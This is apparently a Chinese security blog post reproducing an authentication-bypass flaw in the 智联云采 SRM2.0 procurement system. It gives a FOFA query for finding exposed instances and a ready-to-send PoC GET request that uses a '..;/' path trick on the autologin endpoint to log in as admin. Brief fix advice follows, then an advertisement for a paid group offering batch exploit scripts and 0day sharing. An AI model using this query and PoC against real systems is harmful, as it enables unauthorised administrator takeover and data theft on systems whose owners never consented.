#  「漏洞复现」智联云采 SRM2.0 autologin 身份认证绕过漏洞   
冷漠安全  冷漠安全   2024-09-12 18:00  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
智联云采是一款针对企业供应链管理难题及智能化转型升级需求而设计的解决方案，针对企业供应链管理难题，及智能化转型升级需求，智联云采依托人工智能、物联网、大数据、云等技术，通过软硬件系统化方案，帮助企业实现供应商关系管理和采购线上化、移动化、智能化，提升采购和协同效率，进而规避供需风险，强化供应链整合能力，构建企业利益共同体。  
  
0x03  
  
**漏洞威胁**  
  
由于智联云采 SRM2.0 autologin 接口代码逻辑存在缺陷，导致未授权的攻击者可以构造特殊绕过身份认证直接以管理员身份接管后台，造成信息泄露，使系统处于极不安全的状态。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
title=="SRM 2.0"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rpQdDDYibcWCGkGRcmmEF2NrU0jVDibeadZSOyekvibWee87TvCKknG27O9LFn3Rq62KYZFEwp3en2g/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
GET /adpweb/static/..;/api/sys/app/autologin?loginName=admin HTTP/1.1
Host:
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rpQdDDYibcWCGkGRcmmEF2NSAQ42r2Q6aCy0pbDsSh1iaec3uibfvK2NkHyHaAXKp4uzlc5jz4QgibaQ/640?wx_fmt=png&from=appmsg "")  
  
验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rpQdDDYibcWCGkGRcmmEF2N9zV0UupdHibV5nicvNppxkA0JMNO0ia5BA2y6NH2m3JLuJsDyoGblfianQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rpQdDDYibcWCGkGRcmmEF2NFesjHNSrVARV2Viax5JfZj6qk79W7qqawYlsqjdGWe5RNRUXsWGqcqg/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rpQdDDYibcWCGkGRcmmEF2NvVvIZrjBSoFrh0Hxic4y1UmSdibA3zRFWqsaDeS1tyfj8yq9m3DqDdvg/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0rpQdDDYibcWCGkGRcmmEF2NLYb96dcFbicaBOlzEZkTTN9zDOyibRqwkhdVUPfN3yia9LECbNYWaCKsA/640?wx_fmt=gif&from=appmsg "")  
  
  
